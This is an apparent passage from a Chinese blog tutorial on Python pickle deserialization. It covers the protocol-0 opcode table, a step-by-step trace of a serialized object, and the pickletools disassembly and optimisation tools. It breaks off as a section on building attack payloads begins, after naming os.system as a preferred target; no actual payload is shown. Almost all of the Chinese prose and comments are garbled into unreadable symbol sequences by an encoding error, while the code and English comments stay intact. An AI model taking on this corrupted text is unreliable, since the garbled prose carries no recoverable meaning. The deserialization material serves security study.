<figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs txt">MARK           = b&#x27;(&#x27;   # ÂêëÊ†à‰∏≠ÂéãÂÖ•‰∏Ä‰∏™ MARK Ê†áËÆ∞<br>STOP           = b&#x27;.&#x27;   # Á®ãÂ∫èÁªìÊùüÔºåÊ†àÈ°∂ÁöÑ‰∏Ä‰∏™ÂÖÉÁ¥†‰Ωú‰∏∫ pickle.loads() ÁöÑËøîÂõûÂÄº<br>POP            = b&#x27;0&#x27;   # ‰∏¢ÂºÉÊ†àÈ°∂ÂØπË±°<br>POP_MARK       = b&#x27;1&#x27;   # discard stack top through topmost markobject<br>DUP            = b&#x27;2&#x27;   # duplicate top stack item<br>FLOAT          = b&#x27;F&#x27;   # ÂÆû‰æãÂåñ‰∏Ä‰∏™ float ÂØπË±°<br>INT            = b&#x27;I&#x27;   # ÂÆû‰æãÂåñ‰∏Ä‰∏™ int ÊàñËÄÖ bool ÂØπË±°<br>BININT         = b&#x27;J&#x27;   # push four-byte signed int<br>BININT1        = b&#x27;K&#x27;   # push 1-byte unsigned int<br>LONG           = b&#x27;L&#x27;   # push long; decimal string argument<br>BININT2        = b&#x27;M&#x27;   # push 2-byte unsigned int<br>NONE           = b&#x27;N&#x27;   # Ê†à‰∏≠ÂéãÂÖ• None<br>PERSID         = b&#x27;P&#x27;   # push persistent object; id is taken from string arg<br>BINPERSID      = b&#x27;Q&#x27;   # push persistent object; id is taken from stack<br>REDUCE         = b&#x27;R&#x27;   # ‰ªéÊ†à‰∏äÂºπÂá∫‰∏§‰∏™ÂØπË±°ÔºåÁ¨¨‰∏Ä‰∏™ÂØπË±°‰Ωú‰∏∫ÂèÇÊï∞ÔºàÂøÖÈ°ª‰∏∫ÂÖÉÁªÑÔºâÔºåÁ¨¨‰∫å‰∏™ÂØπË±°‰Ωú‰∏∫ÂáΩÊï∞ÔºåÁÑ∂ÂêéË∞ÉÁî®ËØ•ÂáΩÊï∞Âπ∂ÊääÁªìÊûúÂéãÂõûÊ†à<br>STRING         = b&#x27;S&#x27;   # ÂÆû‰æãÂåñ‰∏Ä‰∏™Â≠óÁ¨¶‰∏≤ÂØπË±°<br>BINSTRING      = b&#x27;T&#x27;   # push string; counted binary string argument<br>SHORT_BINSTRING= b&#x27;U&#x27;   # push string; counted binary string argument &lt; 256 bytes<br>UNICODE        = b&#x27;V&#x27;   # ÂÆû‰æãÂåñ‰∏Ä‰∏™ UNICODE Â≠óÁ¨¶‰∏≤ÂØπË±°<br>BINUNICODE     = b&#x27;X&#x27;   # push Unicode string; counted UTF-8 string argument<br>APPEND         = b&#x27;a&#x27;   # Â∞ÜÊ†àÁöÑÁ¨¨‰∏Ä‰∏™ÂÖÉÁ¥† append Âà∞Á¨¨‰∫å‰∏™ÂÖÉÁ¥†ÔºàÂøÖÈ°ª‰∏∫ÂàóË°®Ôºâ‰∏≠<br>BUILD          = b&#x27;b&#x27;   # ‰ΩøÁî®Ê†à‰∏≠ÁöÑÁ¨¨‰∏Ä‰∏™ÂÖÉÁ¥†ÔºàÂÇ®Â≠òÂ§ö‰∏™ Â±ûÊÄßÂêç-Â±ûÊÄßÂÄº ÁöÑÂ≠óÂÖ∏ÔºâÂØπÁ¨¨‰∫å‰∏™ÂÖÉÁ¥†ÔºàÂØπË±°ÂÆû‰æãÔºâËøõË°åÂ±ûÊÄßËÆæÁΩÆÔºåË∞ÉÁî® __setstate__ Êàñ __dict__.update()<br>GLOBAL         = b&#x27;c&#x27;   # Ëé∑Âèñ‰∏Ä‰∏™ÂÖ®Â±ÄÂØπË±°Êàñ import ‰∏Ä‰∏™Ê®°ÂùóÔºà‰ºöË∞ÉÁî® import ËØ≠Âè•ÔºåËÉΩÂ§üÂºïÂÖ•Êñ∞ÁöÑÂåÖÔºâÔºåÂéãÂÖ•Ê†à<br>DICT           = b&#x27;d&#x27;   # ÂØªÊâæÊ†à‰∏≠ÁöÑ‰∏ä‰∏Ä‰∏™ MARKÔºåÂπ∂ÁªÑÂêà‰πãÈó¥ÁöÑÊï∞ÊçÆ‰∏∫Â≠óÂÖ∏ÔºàÊï∞ÊçÆÂøÖÈ°ªÊúâÂÅ∂Êï∞‰∏™ÔºåÂç≥Âëà key-value ÂØπÔºâÔºåÂºπÂá∫ÁªÑÂêàÔºåÂºπÂá∫ MARKÔºåÂéãÂõûÁªìÊûú<br>EMPTY_DICT     = b&#x27;&#125;&#x27;   # ÂêëÊ†à‰∏≠Áõ¥Êé•ÂéãÂÖ•‰∏Ä‰∏™Á©∫Â≠óÂÖ∏<br>APPENDS        = b&#x27;e&#x27;   # ÂØªÊâæÊ†à‰∏≠ÁöÑ‰∏ä‰∏Ä‰∏™ MARKÔºåÁªÑÂêà‰πãÈó¥ÁöÑÊï∞ÊçÆÂπ∂ extends Âà∞ËØ• MARK ‰πãÂâçÁöÑ‰∏Ä‰∏™ÂÖÉÁ¥†ÔºàÂøÖÈ°ª‰∏∫ÂàóË°®Ôºâ‰∏≠<br>GET            = b&#x27;g&#x27;   # Â∞Ü memo[n] ÁöÑÂéãÂÖ•Ê†à<br>BINGET         = b&#x27;h&#x27;   # push item from memo on stack; index is 1-byte arg<br>INST           = b&#x27;i&#x27;   # Áõ∏ÂΩì‰∫é c Âíå o ÁöÑÁªÑÂêàÔºåÂÖàËé∑Âèñ‰∏Ä‰∏™ÂÖ®Â±ÄÂáΩÊï∞ÔºåÁÑ∂Âêé‰ªéÊ†àÈ°∂ÂºÄÂßãÂØªÊâæÊ†à‰∏≠ÁöÑ‰∏ä‰∏Ä‰∏™ MARKÔºåÂπ∂ÁªÑÂêà‰πãÈó¥ÁöÑÊï∞ÊçÆ‰∏∫ÂÖÉÁªÑÔºå‰ª•ËØ•ÂÖÉÁªÑ‰∏∫ÂèÇÊï∞ÊâßË°åÂÖ®Â±ÄÂáΩÊï∞ÔºàÊàñÂÆû‰æãÂåñ‰∏Ä‰∏™ÂØπË±°Ôºâ<br>LONG_BINGET    = b&#x27;j&#x27;   # push item from memo on stack; index is 4-byte arg<br>LIST           = b&#x27;l&#x27;   # ‰ªéÊ†àÈ°∂ÂºÄÂßãÂØªÊâæÊ†à‰∏≠ÁöÑ‰∏ä‰∏Ä‰∏™ MARKÔºåÂπ∂ÁªÑÂêà‰πãÈó¥ÁöÑÊï∞ÊçÆ‰∏∫ÂàóË°®<br>EMPTY_LIST     = b&#x27;]&#x27;   # ÂêëÊ†à‰∏≠Áõ¥Êé•ÂéãÂÖ•‰∏Ä‰∏™Á©∫ÂàóË°®<br>OBJ            = b&#x27;o&#x27;   # ‰ªéÊ†àÈ°∂ÂºÄÂßãÂØªÊâæÊ†à‰∏≠ÁöÑ‰∏ä‰∏Ä‰∏™ MARKÔºå‰ª•‰πãÈó¥ÁöÑÁ¨¨‰∏Ä‰∏™Êï∞ÊçÆÔºàÂøÖÈ°ª‰∏∫ÂáΩÊï∞Ôºâ‰∏∫ callableÔºåÁ¨¨‰∫å‰∏™Âà∞Á¨¨ n ‰∏™Êï∞ÊçÆ‰∏∫ÂèÇÊï∞ÔºåÊâßË°åËØ•ÂáΩÊï∞ÔºàÊàñÂÆû‰æãÂåñ‰∏Ä‰∏™ÂØπË±°ÔºâÔºåÂºπÂá∫ MARKÔºåÂéãÂõûÁªìÊûúÔºå<br>PUT            = b&#x27;p&#x27;   # Â∞ÜÊ†àÈ°∂ÂØπË±°ÂÇ®Â≠òËá≥ memo[n]<br>BINPUT         = b&#x27;q&#x27;   # store stack top in memo; index is 1-byte arg<br>LONG_BINPUT    = b&#x27;r&#x27;   # store stack top in memo; index is 4-byte arg<br>SETITEM        = b&#x27;s&#x27;   # Â∞ÜÊ†àÁöÑÁ¨¨‰∏Ä‰∏™ÂØπË±°‰Ωú‰∏∫ valueÔºåÁ¨¨‰∫å‰∏™ÂØπË±°‰Ωú‰∏∫ keyÔºåÊ∑ªÂä†ÊàñÊõ¥Êñ∞Âà∞Ê†àÁöÑÁ¨¨‰∏â‰∏™ÂØπË±°ÔºàÂøÖÈ°ª‰∏∫ÂàóË°®ÊàñÂ≠óÂÖ∏ÔºåÂàóË°®‰ª•Êï∞Â≠ó‰Ωú‰∏∫ keyÔºâ‰∏≠<br>TUPLE          = b&#x27;t&#x27;   # ÂØªÊâæÊ†à‰∏≠ÁöÑ‰∏ä‰∏Ä‰∏™ MARKÔºåÂπ∂ÁªÑÂêà‰πãÈó¥ÁöÑÊï∞ÊçÆ‰∏∫ÂÖÉÁªÑÔºåÂºπÂá∫ÁªÑÂêàÔºåÂºπÂá∫ MARKÔºåÂéãÂõûÁªìÊûú<br>EMPTY_TUPLE    = b&#x27;)&#x27;   # ÂêëÊ†à‰∏≠Áõ¥Êé•ÂéãÂÖ•‰∏Ä‰∏™Á©∫ÂÖÉÁªÑ<br>SETITEMS       = b&#x27;u&#x27;   # ÂØªÊâæÊ†à‰∏≠ÁöÑ‰∏ä‰∏Ä‰∏™ MARKÔºåÁªÑÂêà‰πãÈó¥ÁöÑÊï∞ÊçÆÔºàÊï∞ÊçÆÂøÖÈ°ªÊúâÂÅ∂Êï∞‰∏™ÔºåÂç≥Âëà key-value ÂØπÔºâÂπ∂ÂÖ®ÈÉ®Ê∑ªÂä†ÊàñÊõ¥Êñ∞Âà∞ËØ• MARK ‰πãÂâçÁöÑ‰∏Ä‰∏™ÂÖÉÁ¥†ÔºàÂøÖÈ°ª‰∏∫Â≠óÂÖ∏Ôºâ‰∏≠<br>BINFLOAT       = b&#x27;G&#x27;   # push float; arg is 8-byte float encoding<br><br>TRUE           = b&#x27;I01\n&#x27;  # not an opcode; see INT docs in pickletools.py<br>FALSE          = b&#x27;I00\n&#x27;  # not an opcode; see INT docs in pickletools.py<br></code></pre></td></tr></table></figure></p>
<p>ÂΩìÁÑ∂ÔºåËøô‰∫õÈÉΩÊòØ v0 ÂçèËÆÆÁöÑ opcodeÔºåÂÖ∂‰ªñÁâàÊú¨ÁöÑÂçèËÆÆ‰ºöÊñ∞Â¢û/ÊõøÊç¢‰∏Ä‰∫õ opcodeÔºåËØ¶ËßÅËµÑÊñô 2„ÄÇ</p>
<p>‰ª•‰∏äÈù¢ÈÇ£‰∏™ <code>b'ccopy_reg\n_reconstructor\np0\n(c__main__\nTest\np1\nc__builtin__\nobject\np2\nNtp3\nRp4\n(dp5\nVa\np6\nI1\nsb.'</code> ‰∏∫‰æãÔºåÊàë‰ª¨Êù•Ëß£ËØª‰∏Ä‰∏ãËøô‰∏™Â∫èÂàóÂåñÁªìÊûúÔºö</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs python">c copy_reg _reconstructor: stack[copy_reg._reconstructor]<br><br>p <span class="hljs-number">0</span>: memo[copy_reg._reconstructor]<br><br>(: stack[(, copy_reg._reconstructor]<br><br>c __main__ Test: stack[__main__.Test, (, copy_reg._reconstructor]<br><br>p <span class="hljs-number">1</span>: memo[copy_reg._reconstructor, __main__.Test]<br><br>c __builtin__ <span class="hljs-built_in">object</span>: stack[__builtin__.<span class="hljs-built_in">object</span>, __main__.Test, (, copy_reg._reconstructor]<br><br>p <span class="hljs-number">2</span>: memo[copy_reg._reconstructor, __main__.Test, __builtin__.<span class="hljs-built_in">object</span>]<br><br>N: stack[<span class="hljs-literal">None</span>, __builtin__.<span class="hljs-built_in">object</span>, __main__.Test, (, copy_reg._reconstructor]<br><br>t: stack[(<span class="hljs-literal">None</span>, __builtin__.<span class="hljs-built_in">object</span>, __main__.Test), copy_reg._reconstructor]<br><br>p <span class="hljs-number">3</span>: memo[copy_reg._reconstructor, __main__.Test, __builtin__.<span class="hljs-built_in">object</span>, (<span class="hljs-literal">None</span>, __builtin__.<span class="hljs-built_in">object</span>, __main__.Test)]<br><br>R stack[&lt;__main__.Test at <span class="hljs-number">0x160578603d0</span>&gt;]<br><br>p <span class="hljs-number">4</span>: memo[copy_reg._reconstructor, __main__.Test, __builtin__.<span class="hljs-built_in">object</span>, (<span class="hljs-literal">None</span>, __builtin__.<span class="hljs-built_in">object</span>, __main__.Test), &lt;__main__.Test at <span class="hljs-number">0x160578603d0</span>&gt;]<br><br>(: stack[(, &lt;__main__.Test at <span class="hljs-number">0x160578603d0</span>&gt;]<br><br>d: stack[&#123;&#125;, &lt;__main__.Test at <span class="hljs-number">0x160578603d0</span>&gt;]<br><br>p <span class="hljs-number">5</span>: memo[copy_reg._reconstructor, __main__.Test, __builtin__.<span class="hljs-built_in">object</span>, (<span class="hljs-literal">None</span>, __builtin__.<span class="hljs-built_in">object</span>, __main__.Test), &lt;__main__.Test at <span class="hljs-number">0x160578603d0</span>&gt;, &#123;&#125;]<br><br>V a: stack[<span class="hljs-string">&quot;a&quot;</span>, &lt;__main__.Test at <span class="hljs-number">0x160578603d0</span>&gt;]<br><br>p <span class="hljs-number">6</span>: memo[copy_reg._reconstructor, __main__.Test, __builtin__.<span class="hljs-built_in">object</span>, (<span class="hljs-literal">None</span>, __builtin__.<span class="hljs-built_in">object</span>, __main__.Test), &lt;__main__.Test at <span class="hljs-number">0x160578603d0</span>&gt;, &#123;&#125;, <span class="hljs-string">&quot;a&quot;</span>]<br><br>I <span class="hljs-number">1</span>: stack[<span class="hljs-number">1</span>, <span class="hljs-string">&quot;a&quot;</span>, &lt;__main__.Test at <span class="hljs-number">0x160578603d0</span>&gt;]<br><br>s: stack[&#123;<span class="hljs-string">&quot;a&quot;</span>: <span class="hljs-number">1</span>&#125;, &lt;__main__.Test at <span class="hljs-number">0x160578603d0</span>&gt;]<br><br>b: stack[&lt;__main__.Test at <span class="hljs-number">0x160578603d0</span>&gt;]  <span class="hljs-comment"># set a = 1</span><br><br>.: []  <span class="hljs-comment"># ËøîÂõû &lt;__main__.Test at 0x160578603d0&gt;</span><br></code></pre></td></tr></table></figure>
<p>ÊàëÊÑüËßâÔºåÊï¥‰∏™ËøáÁ®ãÊúâÁÇπÂÉèËØ≠Ê≥ïÂàÜÊûêÈáåÁöÑ LR ÁÆóÊ≥ïÔºå‰∏çÊñ≠ÁßªËøõ-ËßÑÁ∫¶„ÄÇ</p>
<p>ËôΩÁÑ∂Ëøô‰∏™ÁªìÊûúÁöÑÂèØËØªÊÄßÂ•Ω‰∫ÜÂæàÂ§öÔºå‰ΩÜÊòØ‰æùÊóß‰∏çÂÆπÊòìËØªÊáÇ„ÄÇ</p>
<p>ÊâÄ‰ª• Python ÂÆòÊñπÊèê‰æõ‰∫ÜÂ∑•ÂÖ∑ÔºåÂè´ <code>pickletools</code>ÔºåÂÆÉÁöÑ‰ΩúÁî®‰∏ªË¶ÅÊòØÔºö</p>
<ol type="1">
<li>ÂèØËØªÊÄßËæÉÂº∫ÁöÑÊñπÂºèÂ±ïÁ§∫‰∏Ä‰∏™Â∫èÂàóÂåñÂØπË±°Ôºà<code>pickletools.dis</code>Ôºâ</li>
<li>ÂØπ‰∏Ä‰∏™Â∫èÂàóÂåñÁªìÊûúËøõË°å‰ºòÂåñÔºà<code>pickletools.optimize</code>Ôºâ</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickletools<br><br><span class="hljs-built_in">print</span>(pickletools.dis(serialized))<br></code></pre></td></tr></table></figure>
<p>ÁªìÊûúÂ¶Ç‰∏ãÔºö</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python">    <span class="hljs-number">0</span>: c    GLOBAL     <span class="hljs-string">&#x27;copy_reg _reconstructor&#x27;</span><br>   <span class="hljs-number">25</span>: p    PUT        <span class="hljs-number">0</span><br>   <span class="hljs-number">28</span>: (    MARK<br>   <span class="hljs-number">29</span>: c        GLOBAL     <span class="hljs-string">&#x27;__main__ Test&#x27;</span><br>   <span class="hljs-number">44</span>: p        PUT        <span class="hljs-number">1</span><br>   <span class="hljs-number">47</span>: c        GLOBAL     <span class="hljs-string">&#x27;__builtin__ object&#x27;</span><br>   <span class="hljs-number">67</span>: p        PUT        <span class="hljs-number">2</span><br>   <span class="hljs-number">70</span>: N        NONE<br>   <span class="hljs-number">71</span>: t        TUPLE      (MARK at <span class="hljs-number">28</span>)<br>   <span class="hljs-number">72</span>: p    PUT        <span class="hljs-number">3</span><br>   <span class="hljs-number">75</span>: R    REDUCE<br>   <span class="hljs-number">76</span>: p    PUT        <span class="hljs-number">4</span><br>   <span class="hljs-number">79</span>: (    MARK<br>   <span class="hljs-number">80</span>: d        DICT       (MARK at <span class="hljs-number">79</span>)<br>   <span class="hljs-number">81</span>: p    PUT        <span class="hljs-number">5</span><br>   <span class="hljs-number">84</span>: V    UNICODE    <span class="hljs-string">&#x27;a&#x27;</span><br>   <span class="hljs-number">87</span>: p    PUT        <span class="hljs-number">6</span><br>   <span class="hljs-number">90</span>: I    INT        <span class="hljs-number">1</span><br>   <span class="hljs-number">93</span>: s    SETITEM<br>   <span class="hljs-number">94</span>: b    BUILD<br>   <span class="hljs-number">95</span>: .    STOP<br>highest protocol among opcodes = <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure>
<p>Ëøô‰∏™Ë¶ÅÊØîËá™Â∑±ÂàÜÊûêÂ∫èÂàóÂåñÁªìÊûúÊ∏ÖÊô∞Â§ö‰∫Ü„ÄÇ</p>
<p>ÁªÜÂøÉÁöÑÊ©òÂèã‰ª¨‰ºöÊ≥®ÊÑèÂà∞ÔºåÂú®‰∏äÈù¢ÈÇ£‰∏™‰∫∫Â∑•ÂàÜÊûêÂ∫èÂàóÂåñÁöÑËøáÁ®ã‰∏≠Ôºåmemo ‰∏ÄÁõ¥ÊòØÂè™ÊúâÂéãÂÖ•ÔºåÊ≤°ÊúâÂºπÂá∫ÔºåÊâÄ‰ª• memo ÈáåÁöÑÊï∞ÊçÆÂéãÊ†πÂ∞±Áî®‰∏çÁùÄÔºåÈÇ£‰πà‰πüÊúâÊ≤°ÂøÖË¶ÅÂéãÂÖ•‰∫Ü„ÄÇÊâÄ‰ª•‰∏äÈù¢ÁöÑÂ∫èÂàóÂåñÁªìÊûúÂÆåÂÖ®ÂèØ‰ª•Êää <code>pn</code> ÈÉΩÂéªÊéâÔºåÂÜçÊää‰∏çÈúÄË¶ÅÁöÑ <code>\n</code> ÁßªÈô§Ôºå‰ºòÂåñ‰∏∫Ôºö<code>b'ccopy_reg\n_reconstructor\n(c__main__\nTest\nc__builtin__\nobject\nNtR(dVa\nI1\nsb.'</code>ÔºåÊàë‰ª¨Êù•ÊâßË°å‰∏Ä‰∏ãËØïËØïÔºö</p>
<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-python/050a2946-9b39-4d74-a074-459fd1f71d80.png!blog#width-zoom8" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
<p>ÂΩìÁÑ∂Ôºå‰πüÂèØ‰ª•Áî® <code>pickletools.optimize</code> Ëá™Âä®‰ºòÂåñÔºö</p>
<p><img src="https://rzx1szyykpugqc-1252075454.piccd.myqcloud.com/SecMap-unserialize-python/282481f9-d78d-45db-aa57-91c9f2fbbea1.png!blog#width-zoom8" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload /></p>
<p>ËôΩÁÑ∂Ëøô‰∏™‰ºòÂåñÁªìÊûú‰∏éÊàë‰ª¨ÊâãÂä®‰ºòÂåñÊòØ‰∏ÄÊ®°‰∏ÄÊ†∑ÁöÑÔºå‰ΩÜÊòØÂú®ÈÅáÂà∞Â§çÊùÇÁöÑÂ∫èÂàóÂåñÁªìÊûúÊó∂ÔºåÊúÄÂ•ΩËøòÊòØÁî®Ëøô‰∏™ÊñπÊ≥ïÊù•Êêû„ÄÇ</p>
<h3 id="Â∞èÁªì">Â∞èÁªì</h3>
<p>Áî±‰∫éÂú®ÂèçÂ∫èÂàóÂåñÁöÑÊó∂ÂÄôÔºåËøô‰∏™ÂØπË±°Ë¶ÅËÉΩÂú®ÂΩìÂâçÁéØÂ¢É‰∏ä‰∏ãÊñá‰∏≠ÂàõÂª∫ÔºåÊâÄ‰ª•Âú®ÂÆûÈôÖÁöÑÂà©Áî®ËøáÁ®ã‰∏≠ÔºåÈÇ£‰∫õÈªòËÆ§Âä†ËΩΩÁöÑÂ∫ì„ÄÅÊ†áÂáÜÂ∫ìÔºàÂèØË¢´Ëá™Âä® importÔºâÂ∞±Êàê‰∫ÜÈ¶ñÈÄâÁöÑÁ±ªÔºåÊØîÂ¶Ç <code>os</code>ÔºåÂÆÉÊúâ <code>system</code> ÊñπÊ≥ï„ÄÇ</p>
<p>ÂØπ‰∫é Python ÂèØ‰ª•Ë¢´ pickle/unpickle ÁöÑÂØπË±°‰ª•ÂèäÂÖ∂‰ªñ‰∏Ä‰∫õÊ≥®ÊÑè‰∫ãÈ°πÔºåÂèØ‰ª•ÂèÇËÄÉÂÆòÊñπÊñáÊ°£ÔºåËßÅËµÑÊñô 3</p>
<p>ÊàëËøôÈáåÂàóÂá∫Âá†ÁÇπÊØîËæÉÈáçË¶ÅÁöÑÔºö</p>
<ol type="1">
<li>ÂáΩÊï∞ÔºàÂÜÖÁΩÆÂáΩÊï∞ÊàñÁî®Êà∑Ëá™ÂÆö‰πâÂáΩÊï∞ÔºâÂú®Ë¢´Â∞ÅÂ≠òÊó∂ÔºåÂºïÁî®ÁöÑÊòØÂáΩÊï∞ÂÖ®ÂêçÔºàËøôÂ∞±ÊòØ‰∏∫‰ªÄ‰πà <code>lambda</code> ÂáΩÊï∞‰∏çÂèØ‰ª•Ë¢´Â∞ÅÂ≠òÔºöÊâÄÊúâÁöÑÂåøÂêçÂáΩÊï∞ÈÉΩÊúâÂêå‰∏Ä‰∏™ÂêçÂ≠óÔºö<code>&lt;lambda&gt;</code>Ôºâ„ÄÇËøôÊÑèÂë≥ÁùÄÂè™ÊúâÂáΩÊï∞ÊâÄÂú®ÁöÑÊ®°ÂùóÂêçÔºå‰∏éÂáΩÊï∞Âêç‰ºöË¢´Â∞ÅÂ≠òÔºåÂáΩÊï∞‰ΩìÂèäÂÖ∂Â±ûÊÄß‰∏ç‰ºöË¢´Â∞ÅÂ≠ò„ÄÇÂõ†Ê≠§ÔºåÂú®Ëß£Â∞ÅÁöÑÁéØÂ¢É‰∏≠ÔºåÂáΩÊï∞ÊâÄÂ±ûÁöÑÊ®°ÂùóÂøÖÈ°ªÊòØÂèØ‰ª•Ë¢´ÂØºÂÖ•ÁöÑÔºåËÄå‰∏îÊ®°ÂùóÂøÖÈ°ªÂåÖÂê´Ëøô‰∏™ÂáΩÊï∞Ë¢´Â∞ÅÂ≠òÊó∂ÁöÑÂêçÁß∞ÔºåÂê¶Âàô‰ºöÊäõÂá∫ÂºÇÂ∏∏</li>
<li>Á±ª‰πüÂè™Â∞ÅÂ≠òÂêçÁß∞ÔºåÊâÄ‰ª•Âú®Ëß£Â∞ÅÁéØÂ¢É‰∏≠‰πüÊúâÂíåÂáΩÊï∞Áõ∏ÂêåÁöÑÈôêÂà∂„ÄÇÊ≥®ÊÑèÔºåÁ±ª‰ΩìÂèäÂÖ∂Êï∞ÊçÆ‰∏ç‰ºöË¢´Â∞ÅÂ≠òÔºåÂè™ÊúâÂÆû‰æãÊï∞ÊçÆ‰ºöË¢´Â∞ÅÂ≠òÔºåÊâÄ‰ª•Âú®‰∏ãÈù¢ÁöÑ‰æãÂ≠ê‰∏≠Á±ªÂ±ûÊÄß attr ‰∏ç‰ºöÂ≠òÂú®‰∫éËß£Â∞ÅÂêéÁöÑÁéØÂ¢É‰∏≠Ôºö<br />
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Foo</span>:<br>    attr = <span class="hljs-string">&#x27;A class attribute&#x27;</span><br><br>picklestring = pickle.dumps(Foo)<br></code></pre></td></tr></table></figure></li>
<li>ÂΩìÂÆû‰æãËß£Â∞ÅÊó∂ÔºåÂÆÉÁöÑ <code>__init__()</code> ÊñπÊ≥ïÈÄöÂ∏∏‰∏ç‰ºöË¢´Ë∞ÉÁî®„ÄÇÂÖ∂ÈªòËÆ§Âä®‰ΩúÊòØÔºöÂÖàÂàõÂª∫‰∏Ä‰∏™Êú™ÂàùÂßãÂåñÁöÑÂÆû‰æãÔºåÁÑ∂ÂêéËøòÂéüÂÖ∂Â±ûÊÄßÔºö<br />
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">save</span>(<span class="hljs-params">obj</span>):<br>    <span class="hljs-keyword">return</span> (obj.__class__, obj.__dict__)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">load</span>(<span class="hljs-params">cls, attributes</span>):<br>    obj = cls.__new__(cls)<br>    obj.__dict__.update(attributes)<br>    <span class="hljs-keyword">return</span> obj<br></code></pre></td></tr></table></figure></li>
</ol>
<p>ÊúÄÂêéÈúÄË¶ÅÊ≥®ÊÑèÁöÑÊòØÔºåÁî±‰∫é <code>0</code> ÁöÑÂ≠òÂú®Ôºå‰∏Ä‰∏™Â∫èÂàóÂåñÂ≠óÁ¨¶‰∏≤ÂèØ‰ª•ÂåÖÂê´ÂæàÂ§ö‰∏™‰∏çÁõ∏ÂÖ≥ÁöÑÊìç‰ΩúÔºåÂú®ÂêéÈù¢‰ºöÊúâ‰∏Ä‰∏™‰æãÂ≠êÊù•ËØ¥Êòé„ÄÇ</p>
<h2 id="ÊîªÂáªÊÄùË∑Ø">ÊîªÂáªÊÄùË∑Ø</h2>
<p>Êú¨Êù•ÊâìÁÆóÊåâÁÖßÊîªÂáªÂú∫ÊôØÊù•ÂàÜÁ±ªÁöÑÔºå‰ΩÜÊòØÊàëÂèëÁé∞Âú∫ÊôØÂ§™Â§ö‰∫ÜÔºåËøòÊòØÊåâÁÖßÊûÑÈÄ†ÊñπÂºèÂàÜÁ±ªÔºåÊîªÂáªÊâãÊ≥ï‰Ωú‰∏∫ÈôÑÂ±ûÁ§∫‰æã‰ºöÊØîËæÉÊ∏ÖÊô∞„ÄÇ</p>
<p>payload ÁöÑÊûÑÈÄ†ÂàÜ‰∏∫Áî®È≠îÊúØÊñπÊ≥ïËá™Âä®ÊûÑÈÄ†ÂíåÊâãÂä®ÊûÑÈÄ†ÔºàÊâãÊêì opcodeÔºâ„ÄÇ</p>
<h3 id="Ëá™Âä®ÊûÑÈÄ†">Ëá™Âä®ÊûÑÈÄ†</h3>
<p>È¶ñÂÖàÔºåËøôÊ†∑Â∫èÂàóÂåñËÇØÂÆöÊòØËææ‰∏çÂà∞ÊîªÂáªÁõÆÁöÑÁöÑÔºö<br />
